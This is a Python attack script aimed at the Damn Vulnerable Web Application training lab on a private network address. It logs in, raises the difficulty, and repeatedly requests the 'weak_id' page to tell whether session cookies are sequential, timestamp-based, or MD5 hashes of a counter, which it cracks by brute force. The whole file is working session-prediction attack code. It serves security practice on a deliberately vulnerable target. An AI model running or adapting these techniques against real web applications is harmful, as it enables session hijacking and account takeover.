"""
    Weak Session IDs in DVWA
"""

import requests
import os
import sys
sys.path.insert(0,'../') # To import dvwa module
import dvwa
import logs
from bs4 import BeautifulSoup
import time
import hashlib
"""
pip install bs4
pip install lxml
"""
logs.log_level = 2
"""
In the low level, the cookie is incremented by 1 each time it's generated
"""
def test_low_cookie(sess, target_cookie="dvwaSession"):
    currentId = 0
    is_incrementation_cookie = False
    logs.print_verbose("Testing incrementing cookie...")
    for i in range(1000):
        resp = sess.post("http://192.168.1.73/dvwa/vulnerabilities/weak_id/")
        if sess.cookies[target_cookie] == str(currentId + 1):
            is_incrementation_cookie = True
        else:
            is_incrementation_cookie = False
            break
        currentId += 1
    if is_incrementation_cookie:
        logs.print_verbose("Cookie seems to be an incrementing cookie")
        return 1
    else:
        logs.print_failure("Cookie is not an incrementing cookie")
        return 0
"""
In the medium level, the cookie is equal to the time variable each time it's incremented
"""
def test_med_cookie(sess, target_cookie="dvwaSession"):
    logs.print_verbose("Testing time cookie...")
    for i in range(1000):
        resp = sess.post("http://192.168.1.73/dvwa/vulnerabilities/weak_id/")
        cookie_time = 0
        cookie_nogoodsync = 0
        current_time_str = str(int(time.time()))
        try:
            if current_time_str == sess.cookies[target_cookie]:
                cookie_time = 1
            elif int(current_time_str) == int(sess.cookies[target_cookie])-1:
                cookie_nogoodsync = 1
            else:
                logs.print_failure("Cookie is not a time cookie")
                return 0
        except:
            pass
    if cookie_time:
        logs.print_verbose("Cookie seems to be a time cookie")
        return 1
    elif cookie_nogoodsync == 1:
        logs.print_verbose("Cookie seems to be a time cookie")
        return 2
def brute_force_md5hash(hash, max=5000):
    for i in range(max):
        h = hashlib.md5(str(i).encode())
        logs.print_debug("Hash : "+hash)
        logs.print_debug("Guess : "+h.hexdigest())
        if(h.hexdigest() == hash):
            logs.print_debug("Ok, hash passed")
            return str(i)
    return 0
"""
In the high level, the cookie is incremented by 1 and get hashed with MD5 algorithm each time it's generated
"""
def test_high_cookie(sess, target_cookie="dvwaSession"):
    logs.print_verbose("Testing hashed cookie...")
    found = 0
    #for i in range(1000):
    for i in range(1000):
        resp = sess.post("http://192.168.1.73/dvwa/vulnerabilities/weak_id/")
        res = brute_force_md5hash(sess.cookies[target_cookie])
        if res == 0:
            logs.print_failure("Cookie brute force failed")
            return 0
        res_hashed = hashlib.md5(res.encode()).hexdigest()
        if res_hashed == sess.cookies[target_cookie]:
            found = 1
        else:
            logs.print_failure("Cookie is not a hashed cookie")
            return 0
    if found == 1:
        logs.print_verbose("Cookie seems to be a hashed cookie")
        return 1

def guessCookieGenMode(sess, target_cookie="dvwaSession"):
    result = test_low_cookie(sess, target_cookie)
    if result == 1:
        return "LOW_COOKIE" # low
    else:
        result = test_med_cookie(sess, target_cookie)
        if result == 1 or result == 2:
            return "MED_COOKIE" # medium
        else:
            result = test_high_cookie(sess, target_cookie)
            if result == 1:
                return "HIGH_COOKIE" # high

def main():
    sess = requests.Session()
    sess = dvwa.login_dvwa(sess, "http://192.168.1.73/dvwa/login.php")
    sess = dvwa.set_dvwa_difficulty(sess, "http://192.168.1.73/dvwa/security.php", "high")
    cook_type = guessCookieGenMode(sess)
    print("Cookie type : "+cook_type)
    
main()